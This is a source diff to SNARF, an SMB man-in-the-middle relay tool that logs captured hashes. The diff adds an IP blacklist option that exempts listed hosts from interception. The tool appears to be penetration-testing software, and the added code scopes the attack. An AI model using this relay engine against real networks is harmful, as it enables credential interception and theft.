@@ -57,6 +57,7 @@ var Getopt     = require("node-getopt");
 var RL         = require('readline');
 var fs         = require('fs');
 var cycle      = require("./cycle.js");
+var bl         = require("./blacklist.js");
 
 out.red("SNARF - 0.2 - SMB Man in the Middle Attack Engine");
 out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (victor@offense-in-depth.com)");
@@ -65,6 +66,7 @@ getopt = new Getopt([
     ['d', 'defaultip=IP'  , 'Default IP (think LLMNR or NBNS)'],
     ['f', 'file=FILE'     , 'Round-robin default destination from file'],
     ['l',       , 'Keep limit of 3 connections for each client/server pair: EXPERIMENTAL'],
+    ['b', 'blacklist=FILE', 'Define an IP blacklist to avoid relaying to specified hosts'],
     ['h',         , 'Show help and usage statement']
 ]);
 
@@ -87,6 +89,17 @@ var globals = new Object;
 var broker  = new SMBBroker(globals);
 var count   = 0;
 var client;
+
+//
+// Initialize the blacklist
+//
+
+out.red("BLACKLIST option " + opt.options['blacklist']);
+if(opt.options['blacklist']) {
+    globals.blacklist = bl.loadBlacklist(opt.options['blacklist']);
+} else {
+    globals.blacklist = new bl.Blacklist();
+}
 
 // 
 // We want to log all hashes we catch in a file.
@@ -128,6 +141,11 @@ client = net.createServer(function(sock) {
         if(tip == bindip || tip == "0.0.0.0") {
             if(globals.defip) { // && globals.defip != "0.0.0.0") {
                 var target = globals.defip();
+                if(!globals.blacklist.ok(sock.remoteAddress)) {
+                    midl.NullMiddler(sock);
+                    out.red("Blacklist prevents relaying " + sock.remoteAddress + " to default destination");
+                    return;
+                }
                 if(target != sock.remoteAddress) {
                     out.red("Got inbound connection, routing to " + target);
                     tip = target;
@@ -151,7 +169,7 @@ client = net.createServer(function(sock) {
 
         var server = net.connect({port: 445, host: tip}, function() {
             if(opt.options['limit'] && broker.countDups(sock.remoteAddress, tip) >= 3) {
-
+                
                 // Sometimes, servers can get fussy if they have too
                 // many open sessions.  This is an EXPERIMENTAL
                 // feature to relay and then throw away any
@@ -159,6 +177,10 @@ client = net.createServer(function(sock) {
                 // we already have three middlers.
 
                 out.red("Hit limit of 3 connections for " + sock.remoteAddress + " -> " + tip + ", relaying");
+                midl.Relay(sock, server);
+                sock.resume();
+            } else if(!globals.blacklist.ok(sock.remoteAddress)) {
+                out.red("Blacklist prevents snarfing connection for " + sock.remoteAddress + ", relaying");
                 midl.Relay(sock, server);
                 sock.resume();
             } else {
